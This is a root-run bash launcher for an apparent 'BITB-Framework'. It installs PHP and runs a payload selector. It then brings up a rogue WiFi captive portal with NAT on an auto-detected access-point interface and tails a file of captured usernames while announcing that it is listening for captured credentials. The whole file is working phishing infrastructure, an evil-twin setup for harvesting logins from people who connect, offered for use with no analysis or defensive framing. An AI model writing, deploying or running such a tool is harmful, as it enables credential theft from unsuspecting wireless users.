#!/usr/bin/env bash

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root. Try: sudo ./run.sh"
   exit 1
fi

cleanup_on_exit() {
    echo -e "\n\n[*] Caught Ctrl+C (SIGINT). Shutting down..."

    echo "[*] Stopping PHP server..."
    pkill -f "php -S 0.0.0.0" 2>/dev/null

    pkill -P $$ tail 2>/dev/null

    if [[ -n "$CP_PID" ]]; then
       kill -TERM "$CP_PID" 2>/dev/null
    fi

    echo "[*] Cleaning up network rules and hostapd..."
    bash cleanup.sh

    ip rule del from 10.99.0.0/24 lookup main priority 100 2>/dev/null

    echo -e "\033[1;32m[+] All processes terminated cleanly. Goodbye!\033[0m"
    exit 0
}

trap cleanup_on_exit INT TERM

if ! command -v php >/dev/null 2>&1; then
    echo "[*] PHP is not installed. Installing php-cli..."
    apt-get update >/dev/null 2>&1
    apt-get install -y php-cli >/dev/null 2>&1
    echo "[+] PHP installed successfully."
fi

echo "[*] Cleaning up old network rules..."
bash cleanup.sh >/dev/null 2>&1

echo "[*] Starting BITB-Framework Payload Selector..."
python3 bitb.py

echo "[*] Ensuring Captive Portal permissions..."
chmod +x captive-portal.sh

echo "[*] Auto-detecting WiFi Interface..."
detect_wifi() {
  local usb_list=() other_list=()
  local ifaces
  ifaces="$(iw dev 2>/dev/null | awk '/Interface/{print $2}')"
  while IFS= read -r iface; do
    [[ -z "$iface" ]] && continue
    local phy
    phy="$(iw dev "$iface" info 2>/dev/null | awk '/wiphy/ {print "phy"$2}')"
    [[ -z "$phy" ]] && continue
    if iw phy "$phy" info 2>/dev/null | awk '/Supported interface modes/,/^$/' | grep -qw 'AP'; then
      local syspath
      syspath="$(readlink -f "/sys/class/net/$iface" 2>/dev/null || true)"
      if [[ "$syspath" == *"/usb"* ]]; then
        usb_list+=("$iface")
      else
        other_list+=("$iface")
      fi
    fi
  done <<< "$ifaces"
  if [[ ${#usb_list[@]} -gt 0 ]]; then echo "${usb_list[0]}"; return 0; fi
  if [[ ${#other_list[@]} -gt 0 ]]; then echo "${other_list[0]}"; return 0; fi
  return 1
}

detect_uplink() {
  ip route show default 2>/dev/null | awk '/^default/ {print $5; exit}'
}

export WIFI_IFACE="${WIFI_IFACE:-$(detect_wifi || true)}"
export UPLINK_IFACE="${UPLINK_IFACE:-$(detect_uplink || true)}"
export AP_NET="10.99.0.0/24"
export ENABLE_NAT="1"

if [[ -z "$WIFI_IFACE" ]]; then
  echo -e "\033[1;31m[x] ERROR: No WiFi interface with AP mode support found.\033[0m"
  cleanup_on_exit
  exit 1
fi
echo -e "\033[1;32m[+] Using WiFi Interface: $WIFI_IFACE\033[0m"
[[ -n "$UPLINK_IFACE" ]] && echo -e "\033[1;32m[+] Using Uplink Interface: $UPLINK_IFACE\033[0m"

WIFI_IFACE="$WIFI_IFACE" UPLINK_IFACE="$UPLINK_IFACE" ENABLE_NAT="1" AP_NET="$AP_NET" ./captive-portal.sh &
CP_PID=$!

ip rule del from "$AP_NET" lookup main priority 100 2>/dev/null
ip rule add from "$AP_NET" lookup main priority 100

echo "[*] Waiting for Captive Portal to initialize..."
sleep 5

if ! kill -0 $CP_PID 2>/dev/null; then
    echo -e "\033[1;31m[x] ERROR: Captive Portal failed to start.\033[0m"
    cleanup_on_exit
    exit 1
fi

echo "========================================================"
echo -e "\033[1;32m[+] SUCCESS: Captive Portal is UP and Running!\033[0m"
echo -e "\033[1;32m[+] Listening for captured credentials...\033[0m"
echo -e "\033[1;33m[!] Press Ctrl+C at any time to safely exit and cleanup.\033[0m"
echo "========================================================"

mkdir -p sites/userpass
touch sites/userpass/usernames.txt

tail -f sites/userpass/usernames.txt &
TAIL_PID=$!

wait $CP_PID
